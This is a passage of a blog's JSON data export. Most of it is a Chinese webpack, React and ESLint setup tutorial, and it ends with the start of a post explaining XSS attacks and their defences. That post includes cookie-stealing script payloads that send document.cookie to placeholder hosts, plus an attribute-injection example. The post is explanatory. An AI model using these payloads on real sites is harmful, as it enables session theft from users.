dev\n\n就会实际上执行\n\n\twebpack-dev-server --devtool eval --progress --colors\n\n### 使用总结\n\n使用`npm run dev`后每次修改并保存`main.js`都会触发一次`webpack`编译，然后在浏览器访问`127.0.0.1:8080`监听8080端口即可看到浏览器渲染结果。","source":"_posts/webpack+es6+react+babel热更新环境搭建.md","raw":"---\n\ntitle: 新时代使用react框架的环境搭建\ntags: ['js', 'webpack', 'react', 'babel']\n\n---\n\n> 作为一名2016年成长起来的前端，怎么能不会react，不会babel，不会es6，不会webpack.....呢\n\n<!-- more -->\n\n## 安装与配置\n\n创建一个目录，就不用说了。这里先取名为`root`。\n\n### 创建项目配置文件`package.json`\n\n\tnpm init\n\n填写相关问题，即可在`root`根目录创建`package.json`文件。\n\n> 注意，其中的package name不能与`npm`的包同名，否则`npm install`的时候会出错，安装不上。另外，创建该配置文件后，后续`npm install`的包都会在安装完成后自动加入`package.json`的字段中。\n\n这里给个目录预告\n\n* /app\n\t* main.js\n\t* component.js\n* /public\n\t* bundle.js\n\t* index.html\n* /node_modules\n\t* ...\n* package.json\n* webpack.config.js\n\n### 安装与配置`webpack`\n\n#### 安装\n\n\tnpm install --save-dev webpack\n\n#### 配置\n\n在根目录`root`创建`webpack.config.js`。\n\n具体配置参数请搜索相关信息，不详细介绍，这里给个例子\n\n\tvar path = require('path');\n\n\tmodule.exports = {\n        entry: path.resolve(__dirname, 'app/main.js'),\n\t    output: {\n\t        path: path.resolve(__dirname, 'public'),\n\t        filename: 'bundle.js',\n\t    },\n\t    module: {\n\t\t    loaders: [\n\t\t      \t{\n\t\t\t\t    test: /\\.js$/, \n\t\t\t\t    exclude: /node_modules/, \n\t\t\t\t    loader: 'babel-loader'\n\t\t\t\t}\n\t\t\t]\n\t    },\n\t};\n\n### 安装与配置`webpack-dev-server`\n\n这是一个能够提供一个可选的本地开发服务器（基于Node创建），用来监听文件改变并自动编译的包\n\n#### 安装\n\n\tnpm install --save-dev webpack-dev-server\n\n#### 配置\n\n在`webpack.config.js`中添加\n\n\tmodule.exports = {\n\t    ......\n\t    devServer: {\n\t    \tcontentBase: \"public\",\n\t\t    historyApiFallback: true,\n\t\t    inline: true,\n\t\t    hot: true\n\t    },\n\t    plugins: [\n\t    \tnew webpack.HotModuleReplacementPlugin()\n\t    ]\n\t};\n\n### 安装react,react-dom\n\n\tnpm install --save-dev react react-dom\n\n> 多个包之间用空格间隔开\n\n### 安装与配置eslint\n\n#### 安装\n\n\tnpm install eslint -g\n\n> 用了全局安装，我在使用时使用本地安装使用时在根目录找不到命令`eslint`不知道为什么，最后一想，反正代码检查全都要用，就全局安装了。后续有时间会研究一下这个问题。\n\n#### 配置\n\n使用`eslint`自带的命令配置即可：\n\n\teslint -init\n\n和`npm init`的形式一样，也是问答式的自动创建。更为方便的是也可以通过这个命令直接使用比如airbnb公司的配置（他们的配置几乎是所有`eslint`使用者的强推，这也看出来大家都用的mac[捂脸],windows下使用`eslint-config-airbnb`每行都错，因为windows使用的换行符是`crlf`而mac是`lf`，他们的配置要求所有换行是`lf`）\n\n## 目录树\n\n安装了一些必要的包之后，目前根目录`root`下的文件结构应该是这样的，其中有三个文件是手动创建的：\n\n* `main.js`：`webpack`打包整个项目时作为唯一入口，引用项目的所有依赖\n* `index.html`：引入`main.js`，作为承载整个项目的页面\n* `component.js`：具体的业务相关逻辑代码存放处，可再细分\n\n而`bundle.js`会在后续中使用`webpack`自动创建。\n\n* /app\n\t* main.js\n\t* component.js\n* /public\n\t* bundle.js\n\t* index.html\n* /node_modules\n\t* ...\n* package.json\n* webpack.config.js\n\n## 使用\n\n### `index.html`，`component.js`和`main.js`的例子\n\n**app/component.js**\n\n\t'use strict';\n\n\tmodule.exports = function () {\n\t    var element = document.createElement('h1');\n\n\t    element.innerHTML = 'Hello world';\n\n\t    return element;\n\t};\n\n**app/main.js**\n\n\t'use strict';\n\tvar component = require('./component.js');\n\n\tdocument.body.appendChild(component());\n\n**index.html**\n\n\t<!DOCTYPE html>\n\t<html>\n\t  <head>\n\t    <meta charset=\"UTF-8\"/>\n\t  </head>\n\t  <body>\n\t    <script src=\"bundle.js\"></script>\n\t  </body>\n\t</html>\n\n好了，最后在根目录运行 \n\n\twebpack\n\n就自动编译出了`bundle.js`。\n\n另外，如果使用自动编译：\n\n\twebpack-dev-server --devtool eval --progress --colors\n\n参数说明：\n\n* webpack-dev-server - 在 localhost:8080 建立一个 Web 服务器\n* --devtool eval - 为代码创建源地址。当有任何报错的时候可以让你更加精确地定位到文件和行号\n* --hot - 需要在`webpack.config.js`中引用一个`plugins`插件`new webpack.HotModuleReplacementPlugin()`才生效\n* --progress - 显示合并代码进度\n* --colors - 在命令行中显示颜色\n* --content-base public - 指向设置的输出目录\n\n附：\n\n|devtool选项\t|配置结果|\n|:--------------|:--------|\n|source-map\t|在一个单独的文件中产生一个完整且功能完全的文件。这个文件具有最好的source map，但是它会减慢打包文件的构建速度；|\n|cheap-module-source-map\t|在一个单独的文件中生成一个不带列映射的map，不带列映射提高项目构建速度，但是也使得浏览器开发者工具只能对应到具体的行，不能对应到具体的列（符号），会对调试造成不便；|\n|eval-source-map\t|使用eval打包源文件模块，在同一个文件中生成干净的完整的source map。这个选项可以在不影响构建速度的前提下生成完整的sourcemap，但是对打包后输出的JS文件的执行具有性能和安全的隐患。不过在开发阶段这是一个非常好的选项，但是在生产阶段一定不要用这个选项；|\n|cheap-module-eval-source-map\t|这是在打包文件时最快的生成source map的方法，生成的Source Map 会和打包后的JavaScript文件同行显示，没有列映射，和eval-source-map选项具有相似的缺点|\n\n\n### 命令行规范\n\n随着工程的复杂化，我们会需要越来越多的命令去执行，规范的行为是，统一放到`package.json`的`scripts`字段中，统一管理。\n\n像上面的 \n\n`webpack-dev-server --devtool eval --progress --colors`\n\n命令，可以这样配置`scripts`字段(`key`名可以任意起，这里叫`build`，`dev`)\n\n\t\"scripts\": {\n\t\t\"build\": \"webpack\",\n    \t\"dev\": \"webpack-dev-server --devtool eval --progress --colors\"\n\t}\n\n这样每次使用\n\n\tnpm run dev\n\n就会实际上执行\n\n\twebpack-dev-server --devtool eval --progress --colors\n\n### 使用总结\n\n使用`npm run dev`后每次修改并保存`main.js`都会触发一次`webpack`编译，然后在浏览器访问`127.0.0.1:8080`监听8080端口即可看到浏览器渲染结果。","slug":"webpack+es6+react+babel热更新环境搭建","published":1,"date":"2017-04-22T07:50:08.681Z","updated":"2017-04-22T08:23:16.850Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9ft3s4b000al8sl5885inkl","content":"<blockquote>\n<p>作为一名2016年成长起来的前端，怎么能不会react，不会babel，不会es6，不会webpack…..呢</p>\n</blockquote>\n<a id=\"more\"></a>\n<h2 id=\"安装与配置\"><a href=\"#安装与配置\" class=\"headerlink\" title=\"安装与配置\"></a>安装与配置</h2><p>创建一个目录，就不用说了。这里先取名为<code>root</code>。</p>\n<h3 id=\"创建项目配置文件package-json\"><a href=\"#创建项目配置文件package-json\" class=\"headerlink\" title=\"创建项目配置文件package.json\"></a>创建项目配置文件<code>package.json</code></h3><pre><code>npm init\n</code></pre><p>填写相关问题，即可在<code>root</code>根目录创建<code>package.json</code>文件。</p>\n<blockquote>\n<p>注意，其中的package name不能与<code>npm</code>的包同名，否则<code>npm install</code>的时候会出错，安装不上。另外，创建该配置文件后，后续<code>npm install</code>的包都会在安装完成后自动加入<code>package.json</code>的字段中。</p>\n</blockquote>\n<p>这里给个目录预告</p>\n<ul>\n<li>/app<ul>\n<li>main.js</li>\n<li>component.js</li>\n</ul>\n</li>\n<li>/public<ul>\n<li>bundle.js</li>\n<li>index.html</li>\n</ul>\n</li>\n<li>/node_modules<ul>\n<li>…</li>\n</ul>\n</li>\n<li>package.json</li>\n<li>webpack.config.js</li>\n</ul>\n<h3 id=\"安装与配置webpack\"><a href=\"#安装与配置webpack\" class=\"headerlink\" title=\"安装与配置webpack\"></a>安装与配置<code>webpack</code></h3><h4 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h4><pre><code>npm install --save-dev webpack\n</code></pre><h4 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h4><p>在根目录<code>root</code>创建<code>webpack.config.js</code>。</p>\n<p>具体配置参数请搜索相关信息，不详细介绍，这里给个例子</p>\n<pre><code>var path = require(&apos;path&apos;);\n\nmodule.exports = {\n    entry: path.resolve(__dirname, &apos;app/main.js&apos;),\n    output: {\n        path: path.resolve(__dirname, &apos;public&apos;),\n        filename: &apos;bundle.js&apos;,\n    },\n    module: {\n        loaders: [\n              {\n                test: /\\.js$/, \n                exclude: /node_modules/, \n                loader: &apos;babel-loader&apos;\n            }\n        ]\n    },\n};\n</code></pre><h3 id=\"安装与配置webpack-dev-server\"><a href=\"#安装与配置webpack-dev-server\" class=\"headerlink\" title=\"安装与配置webpack-dev-server\"></a>安装与配置<code>webpack-dev-server</code></h3><p>这是一个能够提供一个可选的本地开发服务器（基于Node创建），用来监听文件改变并自动编译的包</p>\n<h4 id=\"安装-1\"><a href=\"#安装-1\" class=\"headerlink\" title=\"安装\"></a>安装</h4><pre><code>npm install --save-dev webpack-dev-server\n</code></pre><h4 id=\"配置-1\"><a href=\"#配置-1\" class=\"headerlink\" title=\"配置\"></a>配置</h4><p>在<code>webpack.config.js</code>中添加</p>\n<pre><code>module.exports = {\n    ......\n    devServer: {\n        contentBase: &quot;public&quot;,\n        historyApiFallback: true,\n        inline: true,\n        hot: true\n    },\n    plugins: [\n        new webpack.HotModuleReplacementPlugin()\n    ]\n};\n</code></pre><h3 id=\"安装react-react-dom\"><a href=\"#安装react-react-dom\" class=\"headerlink\" title=\"安装react,react-dom\"></a>安装react,react-dom</h3><pre><code>npm install --save-dev react react-dom\n</code></pre><blockquote>\n<p>多个包之间用空格间隔开</p>\n</blockquote>\n<h3 id=\"安装与配置eslint\"><a href=\"#安装与配置eslint\" class=\"headerlink\" title=\"安装与配置eslint\"></a>安装与配置eslint</h3><h4 id=\"安装-2\"><a href=\"#安装-2\" class=\"headerlink\" title=\"安装\"></a>安装</h4><pre><code>npm install eslint -g\n</code></pre><blockquote>\n<p>用了全局安装，我在使用时使用本地安装使用时在根目录找不到命令<code>eslint</code>不知道为什么，最后一想，反正代码检查全都要用，就全局安装了。后续有时间会研究一下这个问题。</p>\n</blockquote>\n<h4 id=\"配置-2\"><a href=\"#配置-2\" class=\"headerlink\" title=\"配置\"></a>配置</h4><p>使用<code>eslint</code>自带的命令配置即可：</p>\n<pre><code>eslint -init\n</code></pre><p>和<code>npm init</code>的形式一样，也是问答式的自动创建。更为方便的是也可以通过这个命令直接使用比如airbnb公司的配置（他们的配置几乎是所有<code>eslint</code>使用者的强推，这也看出来大家都用的mac[捂脸],windows下使用<code>eslint-config-airbnb</code>每行都错，因为windows使用的换行符是<code>crlf</code>而mac是<code>lf</code>，他们的配置要求所有换行是<code>lf</code>）</p>\n<h2 id=\"目录树\"><a href=\"#目录树\" class=\"headerlink\" title=\"目录树\"></a>目录树</h2><p>安装了一些必要的包之后，目前根目录<code>root</code>下的文件结构应该是这样的，其中有三个文件是手动创建的：</p>\n<ul>\n<li><code>main.js</code>：<code>webpack</code>打包整个项目时作为唯一入口，引用项目的所有依赖</li>\n<li><code>index.html</code>：引入<code>main.js</code>，作为承载整个项目的页面</li>\n<li><code>component.js</code>：具体的业务相关逻辑代码存放处，可再细分</li>\n</ul>\n<p>而<code>bundle.js</code>会在后续中使用<code>webpack</code>自动创建。</p>\n<ul>\n<li>/app<ul>\n<li>main.js</li>\n<li>component.js</li>\n</ul>\n</li>\n<li>/public<ul>\n<li>bundle.js</li>\n<li>index.html</li>\n</ul>\n</li>\n<li>/node_modules<ul>\n<li>…</li>\n</ul>\n</li>\n<li>package.json</li>\n<li>webpack.config.js</li>\n</ul>\n<h2 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h2><h3 id=\"index-html，component-js和main-js的例子\"><a href=\"#index-html，component-js和main-js的例子\" class=\"headerlink\" title=\"index.html，component.js和main.js的例子\"></a><code>index.html</code>，<code>component.js</code>和<code>main.js</code>的例子</h3><p><strong>app/component.js</strong></p>\n<pre><code>&apos;use strict&apos;;\n\nmodule.exports = function () {\n    var element = document.createElement(&apos;h1&apos;);\n\n    element.innerHTML = &apos;Hello world&apos;;\n\n    return element;\n};\n</code></pre><p><strong>app/main.js</strong></p>\n<pre><code>&apos;use strict&apos;;\nvar component = require(&apos;./component.js&apos;);\n\ndocument.body.appendChild(component());\n</code></pre><p><strong>index.html</strong></p>\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;meta charset=&quot;UTF-8&quot;/&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;script src=&quot;bundle.js&quot;&gt;&lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre><p>好了，最后在根目录运行 </p>\n<pre><code>webpack\n</code></pre><p>就自动编译出了<code>bundle.js</code>。</p>\n<p>另外，如果使用自动编译：</p>\n<pre><code>webpack-dev-server --devtool eval --progress --colors\n</code></pre><p>参数说明：</p>\n<ul>\n<li>webpack-dev-server - 在 localhost:8080 建立一个 Web 服务器</li>\n<li>–devtool eval - 为代码创建源地址。当有任何报错的时候可以让你更加精确地定位到文件和行号</li>\n<li>–hot - 需要在<code>webpack.config.js</code>中引用一个<code>plugins</code>插件<code>new webpack.HotModuleReplacementPlugin()</code>才生效</li>\n<li>–progress - 显示合并代码进度</li>\n<li>–colors - 在命令行中显示颜色</li>\n<li>–content-base public - 指向设置的输出目录</li>\n</ul>\n<p>附：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">devtool选项</th>\n<th style=\"text-align:left\">配置结果</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">source-map</td>\n<td style=\"text-align:left\">在一个单独的文件中产生一个完整且功能完全的文件。这个文件具有最好的source map，但是它会减慢打包文件的构建速度；</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">cheap-module-source-map</td>\n<td style=\"text-align:left\">在一个单独的文件中生成一个不带列映射的map，不带列映射提高项目构建速度，但是也使得浏览器开发者工具只能对应到具体的行，不能对应到具体的列（符号），会对调试造成不便；</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">eval-source-map</td>\n<td style=\"text-align:left\">使用eval打包源文件模块，在同一个文件中生成干净的完整的source map。这个选项可以在不影响构建速度的前提下生成完整的sourcemap，但是对打包后输出的JS文件的执行具有性能和安全的隐患。不过在开发阶段这是一个非常好的选项，但是在生产阶段一定不要用这个选项；</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">cheap-module-eval-source-map</td>\n<td style=\"text-align:left\">这是在打包文件时最快的生成source map的方法，生成的Source Map 会和打包后的JavaScript文件同行显示，没有列映射，和eval-source-map选项具有相似的缺点</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"命令行规范\"><a href=\"#命令行规范\" class=\"headerlink\" title=\"命令行规范\"></a>命令行规范</h3><p>随着工程的复杂化，我们会需要越来越多的命令去执行，规范的行为是，统一放到<code>package.json</code>的<code>scripts</code>字段中，统一管理。</p>\n<p>像上面的 </p>\n<p><code>webpack-dev-server --devtool eval --progress --colors</code></p>\n<p>命令，可以这样配置<code>scripts</code>字段(<code>key</code>名可以任意起，这里叫<code>build</code>，<code>dev</code>)</p>\n<pre><code>&quot;scripts&quot;: {\n    &quot;build&quot;: &quot;webpack&quot;,\n    &quot;dev&quot;: &quot;webpack-dev-server --devtool eval --progress --colors&quot;\n}\n</code></pre><p>这样每次使用</p>\n<pre><code>npm run dev\n</code></pre><p>就会实际上执行</p>\n<pre><code>webpack-dev-server --devtool eval --progress --colors\n</code></pre><h3 id=\"使用总结\"><a href=\"#使用总结\" class=\"headerlink\" title=\"使用总结\"></a>使用总结</h3><p>使用<code>npm run dev</code>后每次修改并保存<code>main.js</code>都会触发一次<code>webpack</code>编译，然后在浏览器访问<code>127.0.0.1:8080</code>监听8080端口即可看到浏览器渲染结果。</p>\n","site":{"data":{"head":{"Name":"<script> var _hmt = _hmt || []; (function() { var hm = document.createElement('script'); hm.src = 'https://hm.baidu.com/hm.js?348e7e9c1ba7a17f316c54cb6795dec7'; var s = document.getElementsByTagName('script')[0];  s.parentNode.insertBefore(hm, s); })(); </script>"}}},"excerpt":"<blockquote>\n<p>作为一名2016年成长起来的前端，怎么能不会react，不会babel，不会es6，不会webpack…..呢</p>\n</blockquote>","more":"<h2 id=\"安装与配置\"><a href=\"#安装与配置\" class=\"headerlink\" title=\"安装与配置\"></a>安装与配置</h2><p>创建一个目录，就不用说了。这里先取名为<code>root</code>。</p>\n<h3 id=\"创建项目配置文件package-json\"><a href=\"#创建项目配置文件package-json\" class=\"headerlink\" title=\"创建项目配置文件package.json\"></a>创建项目配置文件<code>package.json</code></h3><pre><code>npm init\n</code></pre><p>填写相关问题，即可在<code>root</code>根目录创建<code>package.json</code>文件。</p>\n<blockquote>\n<p>注意，其中的package name不能与<code>npm</code>的包同名，否则<code>npm install</code>的时候会出错，安装不上。另外，创建该配置文件后，后续<code>npm install</code>的包都会在安装完成后自动加入<code>package.json</code>的字段中。</p>\n</blockquote>\n<p>这里给个目录预告</p>\n<ul>\n<li>/app<ul>\n<li>main.js</li>\n<li>component.js</li>\n</ul>\n</li>\n<li>/public<ul>\n<li>bundle.js</li>\n<li>index.html</li>\n</ul>\n</li>\n<li>/node_modules<ul>\n<li>…</li>\n</ul>\n</li>\n<li>package.json</li>\n<li>webpack.config.js</li>\n</ul>\n<h3 id=\"安装与配置webpack\"><a href=\"#安装与配置webpack\" class=\"headerlink\" title=\"安装与配置webpack\"></a>安装与配置<code>webpack</code></h3><h4 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h4><pre><code>npm install --save-dev webpack\n</code></pre><h4 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h4><p>在根目录<code>root</code>创建<code>webpack.config.js</code>。</p>\n<p>具体配置参数请搜索相关信息，不详细介绍，这里给个例子</p>\n<pre><code>var path = require(&apos;path&apos;);\n\nmodule.exports = {\n    entry: path.resolve(__dirname, &apos;app/main.js&apos;),\n    output: {\n        path: path.resolve(__dirname, &apos;public&apos;),\n        filename: &apos;bundle.js&apos;,\n    },\n    module: {\n        loaders: [\n              {\n                test: /\\.js$/, \n                exclude: /node_modules/, \n                loader: &apos;babel-loader&apos;\n            }\n        ]\n    },\n};\n</code></pre><h3 id=\"安装与配置webpack-dev-server\"><a href=\"#安装与配置webpack-dev-server\" class=\"headerlink\" title=\"安装与配置webpack-dev-server\"></a>安装与配置<code>webpack-dev-server</code></h3><p>这是一个能够提供一个可选的本地开发服务器（基于Node创建），用来监听文件改变并自动编译的包</p>\n<h4 id=\"安装-1\"><a href=\"#安装-1\" class=\"headerlink\" title=\"安装\"></a>安装</h4><pre><code>npm install --save-dev webpack-dev-server\n</code></pre><h4 id=\"配置-1\"><a href=\"#配置-1\" class=\"headerlink\" title=\"配置\"></a>配置</h4><p>在<code>webpack.config.js</code>中添加</p>\n<pre><code>module.exports = {\n    ......\n    devServer: {\n        contentBase: &quot;public&quot;,\n        historyApiFallback: true,\n        inline: true,\n        hot: true\n    },\n    plugins: [\n        new webpack.HotModuleReplacementPlugin()\n    ]\n};\n</code></pre><h3 id=\"安装react-react-dom\"><a href=\"#安装react-react-dom\" class=\"headerlink\" title=\"安装react,react-dom\"></a>安装react,react-dom</h3><pre><code>npm install --save-dev react react-dom\n</code></pre><blockquote>\n<p>多个包之间用空格间隔开</p>\n</blockquote>\n<h3 id=\"安装与配置eslint\"><a href=\"#安装与配置eslint\" class=\"headerlink\" title=\"安装与配置eslint\"></a>安装与配置eslint</h3><h4 id=\"安装-2\"><a href=\"#安装-2\" class=\"headerlink\" title=\"安装\"></a>安装</h4><pre><code>npm install eslint -g\n</code></pre><blockquote>\n<p>用了全局安装，我在使用时使用本地安装使用时在根目录找不到命令<code>eslint</code>不知道为什么，最后一想，反正代码检查全都要用，就全局安装了。后续有时间会研究一下这个问题。</p>\n</blockquote>\n<h4 id=\"配置-2\"><a href=\"#配置-2\" class=\"headerlink\" title=\"配置\"></a>配置</h4><p>使用<code>eslint</code>自带的命令配置即可：</p>\n<pre><code>eslint -init\n</code></pre><p>和<code>npm init</code>的形式一样，也是问答式的自动创建。更为方便的是也可以通过这个命令直接使用比如airbnb公司的配置（他们的配置几乎是所有<code>eslint</code>使用者的强推，这也看出来大家都用的mac[捂脸],windows下使用<code>eslint-config-airbnb</code>每行都错，因为windows使用的换行符是<code>crlf</code>而mac是<code>lf</code>，他们的配置要求所有换行是<code>lf</code>）</p>\n<h2 id=\"目录树\"><a href=\"#目录树\" class=\"headerlink\" title=\"目录树\"></a>目录树</h2><p>安装了一些必要的包之后，目前根目录<code>root</code>下的文件结构应该是这样的，其中有三个文件是手动创建的：</p>\n<ul>\n<li><code>main.js</code>：<code>webpack</code>打包整个项目时作为唯一入口，引用项目的所有依赖</li>\n<li><code>index.html</code>：引入<code>main.js</code>，作为承载整个项目的页面</li>\n<li><code>component.js</code>：具体的业务相关逻辑代码存放处，可再细分</li>\n</ul>\n<p>而<code>bundle.js</code>会在后续中使用<code>webpack</code>自动创建。</p>\n<ul>\n<li>/app<ul>\n<li>main.js</li>\n<li>component.js</li>\n</ul>\n</li>\n<li>/public<ul>\n<li>bundle.js</li>\n<li>index.html</li>\n</ul>\n</li>\n<li>/node_modules<ul>\n<li>…</li>\n</ul>\n</li>\n<li>package.json</li>\n<li>webpack.config.js</li>\n</ul>\n<h2 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h2><h3 id=\"index-html，component-js和main-js的例子\"><a href=\"#index-html，component-js和main-js的例子\" class=\"headerlink\" title=\"index.html，component.js和main.js的例子\"></a><code>index.html</code>，<code>component.js</code>和<code>main.js</code>的例子</h3><p><strong>app/component.js</strong></p>\n<pre><code>&apos;use strict&apos;;\n\nmodule.exports = function () {\n    var element = document.createElement(&apos;h1&apos;);\n\n    element.innerHTML = &apos;Hello world&apos;;\n\n    return element;\n};\n</code></pre><p><strong>app/main.js</strong></p>\n<pre><code>&apos;use strict&apos;;\nvar component = require(&apos;./component.js&apos;);\n\ndocument.body.appendChild(component());\n</code></pre><p><strong>index.html</strong></p>\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;meta charset=&quot;UTF-8&quot;/&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;script src=&quot;bundle.js&quot;&gt;&lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre><p>好了，最后在根目录运行 </p>\n<pre><code>webpack\n</code></pre><p>就自动编译出了<code>bundle.js</code>。</p>\n<p>另外，如果使用自动编译：</p>\n<pre><code>webpack-dev-server --devtool eval --progress --colors\n</code></pre><p>参数说明：</p>\n<ul>\n<li>webpack-dev-server - 在 localhost:8080 建立一个 Web 服务器</li>\n<li>–devtool eval - 为代码创建源地址。当有任何报错的时候可以让你更加精确地定位到文件和行号</li>\n<li>–hot - 需要在<code>webpack.config.js</code>中引用一个<code>plugins</code>插件<code>new webpack.HotModuleReplacementPlugin()</code>才生效</li>\n<li>–progress - 显示合并代码进度</li>\n<li>–colors - 在命令行中显示颜色</li>\n<li>–content-base public - 指向设置的输出目录</li>\n</ul>\n<p>附：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">devtool选项</th>\n<th style=\"text-align:left\">配置结果</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">source-map</td>\n<td style=\"text-align:left\">在一个单独的文件中产生一个完整且功能完全的文件。这个文件具有最好的source map，但是它会减慢打包文件的构建速度；</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">cheap-module-source-map</td>\n<td style=\"text-align:left\">在一个单独的文件中生成一个不带列映射的map，不带列映射提高项目构建速度，但是也使得浏览器开发者工具只能对应到具体的行，不能对应到具体的列（符号），会对调试造成不便；</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">eval-source-map</td>\n<td style=\"text-align:left\">使用eval打包源文件模块，在同一个文件中生成干净的完整的source map。这个选项可以在不影响构建速度的前提下生成完整的sourcemap，但是对打包后输出的JS文件的执行具有性能和安全的隐患。不过在开发阶段这是一个非常好的选项，但是在生产阶段一定不要用这个选项；</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">cheap-module-eval-source-map</td>\n<td style=\"text-align:left\">这是在打包文件时最快的生成source map的方法，生成的Source Map 会和打包后的JavaScript文件同行显示，没有列映射，和eval-source-map选项具有相似的缺点</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"命令行规范\"><a href=\"#命令行规范\" class=\"headerlink\" title=\"命令行规范\"></a>命令行规范</h3><p>随着工程的复杂化，我们会需要越来越多的命令去执行，规范的行为是，统一放到<code>package.json</code>的<code>scripts</code>字段中，统一管理。</p>\n<p>像上面的 </p>\n<p><code>webpack-dev-server --devtool eval --progress --colors</code></p>\n<p>命令，可以这样配置<code>scripts</code>字段(<code>key</code>名可以任意起，这里叫<code>build</code>，<code>dev</code>)</p>\n<pre><code>&quot;scripts&quot;: {\n    &quot;build&quot;: &quot;webpack&quot;,\n    &quot;dev&quot;: &quot;webpack-dev-server --devtool eval --progress --colors&quot;\n}\n</code></pre><p>这样每次使用</p>\n<pre><code>npm run dev\n</code></pre><p>就会实际上执行</p>\n<pre><code>webpack-dev-server --devtool eval --progress --colors\n</code></pre><h3 id=\"使用总结\"><a href=\"#使用总结\" class=\"headerlink\" title=\"使用总结\"></a>使用总结</h3><p>使用<code>npm run dev</code>后每次修改并保存<code>main.js</code>都会触发一次<code>webpack</code>编译，然后在浏览器访问<code>127.0.0.1:8080</code>监听8080端口即可看到浏览器渲染结果。</p>"},{"title":"前端安全：XSS和CSRF","_content":"\n## XSS攻击\n\nXSS（cross-site scripting跨域脚本攻击）攻击是最常见的WEB攻击之一，其重点是“**跨域**”和“**客户端执行**”。\n\nXSS攻击分为三种\n\n* Reflected XSS\n* Stored XSS\n* DOM-based or loacl XSS\n\n<!-- more -->\n\n### Reflected XSS\n\n基于反射的XSS攻击，主要依靠站点服务端返回脚本，在客户端触发执行从而发起Web攻击。\n\n##### 例子，做个假设：\n\n1. 当亚马逊在搜索书籍，搜不到书的时候显示提交的名称。\n\n2. 在搜索框搜索内容，填入`<script>alert('handsome boy')</script>`, 点击搜索。\n\n3. 当前端页面没有对返回的数据进行过滤，直接显示在页面上， 这时就会alert那个字符串出来。\n\n4. 进而可以构造获取用户cookies的地址，通过QQ群或者垃圾邮件，来让其他人点击这个地址：\n`http://www.amazon.cn/search?name=<script>document.location='http://xxx/get?cookie='+document.cookie</script>`\n\n##### 例子：\n\n对于一个图书馆网站book.com\n\n假设右上角有一个搜索书籍的地方，可以按书名搜索书籍（book.com/search?name=时间简史），于是弹出《时间简史》的相关信息。\n\n但是如果输入`<script>alert('没有书开个毛线书店啊')</script>`，假设这个图书馆站点没有对数据做任何过滤，而且会原封不动地把用户输入的数据展示回来，那么返回的页面自然也会返回这段脚本，从而执行它。\n\n既然要做攻击，我们就要获取用户的数据，要获取数据自然要把信息传回我们的服务器（假设接收信息的地址是http://vajoy/get），那么可以这样写：\n`<script>document.location='http://vajoy/get?cookie='+document.cookie</script>`\n\n不过这样收到的总是我们自己的数据，我们要收集的应该是别人的cookie信息。\n\n所以之后便可以通过QQ群，或者通过群发垃圾邮件，来让其他人点击这个地址：\n`book.com/search?name=<script>document.location='http://vajoy/get?cookie='+document.cookie</script>`\n\n这样就可以依靠站点服务端返回脚本，在客户端触发执行从而发起WEB攻击，进行Reflected XSS攻击。\n\n#### 开发安全措施\n\n1. 前端在显示服务端数据时候，不仅是标签内容需要过滤、转义，就连属性值也都可能需要。\n\n2. 后端接收请求时，验证请求是否为攻击请求，攻击则屏蔽。\n\n##### 例如：\n\n标签：\n\n`<span><script>alert('handsome boy')</script></span>`\n\n转义\n\n`<span>&lt;script&gt;alert(&#39;handsome boy&#39;)&lt;/script&gt</span>`\n\n属性：\n\n如果一个input的value属性值是\n\n`琅琊榜\" onclick=\"javascript:alert('handsome boy')`\n就可能出现\n\n`<input type=\"text\" value=\"琅琊榜\" onclick=\"javascript:alert('handsome boy')\">`\n\n点击input导致攻击脚本被执行，解决方式可以对script或者双引号进行过滤。\n\n### Stored XSS\n\n基于存储的XSS攻击，是通过发表带有恶意跨域脚本的帖子/文章，从而把恶意脚本存储在服务器，每个访问该帖子/文章的人就会触发执行。\n\n##### 例子：\n\n1. 发一篇文章，里面包含了恶意脚本\n\n\t`今天天气不错啊！<script>alert('handsome boy')</script>`\n\n2. 后端没有对文章进行过滤，直接保存文章内容到数据库。\n\n3. 当其他看这篇文章的时候，包含的恶意脚本就会执行。\n\n> 因为大部分文章是保存整个HTML内容的，前端显示时候也不做过滤，就极可能出现这种情况。\n\n##### 结论：\n\n后端尽可能对提交数据做过滤，在场景需求而不过滤的情况下，前端就需要做些处理了。\n\n##### 开发安全措施：\n\n1. 首要是服务端要进行过滤，因为前端的校验可以被绕过。\n\n2. 当服务端不校验时候，前端要以各种方式过滤里面可能的恶意脚本，例如script标签，将特殊字符转换成HTML编码。\n\n### DOM-based or local XSS\n\n基于DOM或本地的XSS攻击。一般是提供一个免费的wifi，但是提供免费wifi的网关会往你访问的任何页面插入一段脚本或者是直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。\n\n##### 例子1：\n\n1. 提供一个免费的wifi。\n\n2. 